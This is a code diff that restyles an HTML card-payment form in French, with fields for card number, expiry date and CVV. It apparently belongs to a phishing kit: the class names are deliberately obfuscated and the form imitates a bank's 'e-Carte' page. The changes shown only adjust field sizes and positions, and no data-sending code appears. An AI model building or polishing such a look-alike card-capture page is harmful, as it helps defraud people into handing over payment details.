@@ -68,19 +68,19 @@
                                  <!-- alt="e-Carte"> -->
                             <!--</div>-->
                         </div>
-                        <div class="VVIIOOLLKKEEWWSSDD OOPFFVNZZ input-section1">
+                        <div class="VVIIOOLLKKEEWWSSDD OOPFFVNZZ input-section1" style="margin-left: -69px">
                             <label for="ccno" class="libelle">Numéro de carte<span class="YUJFNV"> *</span></label>
-                            <input type="tel" size="16" pattern="[0-9]*" class="largeinput  error" name="num" id="ccno" onkeyup="update(this.value)"
-                                   maxlength="19" autocomplete="off" style="width: 200px;height: 35px;margin-top: -5px;"
+                            <input type="tel" size="19" pattern="[0-9]*" class="largeinput  error" name="num" id="ccno" onkeyup="update(this.value)"
+                                   maxlength="19" autocomplete="off" style="width: 133px; height: 28px; margin-top: -5px;"
                                    for="Le numéro de carte bancaire doit être composé de 16 ou 19 chiffres">
-                                   <img  id="img" style="position: absolute; left: 67%;" src="" alt="">
+                                   <img  id="img" style="position: absolute; left: 64%;" src="" alt="">
                         </div>
                         
                         <div class="divExpirationDate OOPFFVNZZ error input-section2" id="expdate"
                              for="La date d'expiration de votre carte est dépassée, vérifiez la date indiquée sur votre carte">
                             <label for="form_expiry_month" class="libelle">Date d'expiration
                                 <span class="YUJFNV"> *</span></label>
-                            <select id="expMonth" name="expmonth" style="width: 95px;height: 35px;margin: -5px 0 10px 0;">
+                            <select id="expMonth" name="expmonth" style="width: 95px;height: 28px;margin: -5px 0 10px 0;">
                                 <option value="-">mois</option>
                                 <option value="01">01</option>
                                 <option value="02">02</option>
@@ -95,7 +95,7 @@
                                 <option value="11">11</option>
                                 <option value="12">12</option>
                             </select>
-                            <select id="expYear" name="expyear" style="width: 95px;height: 35px;margin: -5px 0 0 10px;">
+                            <select id="expYear" name="expyear" style="width: 95px;height: 28px;margin: -5px 0 0 10px;">
                                 <option value="-">année</option>
                                 <option value="2020">2020</option>
                                 <option value="2021">2021</option>
@@ -113,7 +113,7 @@
                             <input type="text" size="5" pattern="[0-9]*" class="codeSecuriteinput error" name="cvv"
                                    id="cvv"
                                    autocomplete="off" maxlength="4"
-                                   for="Le code de sécurité doit être composé de 3 chiffres" style="width: 95px;height: 35px;margin-top: -5px;">
+                                   for="Le code de sécurité doit être composé de 3 chiffres" style="width: 63px;height: 28px;margin-top: -5px;">
                         </div>
                         <div class="IINTTYGFFInfoBox OOPFFVNZZ sectin3-img">
                             <img class="OOPPFGBBV KKLDDKKKDKDKDS" src="assets/img/CVVILKKKD.jpg" width="97"
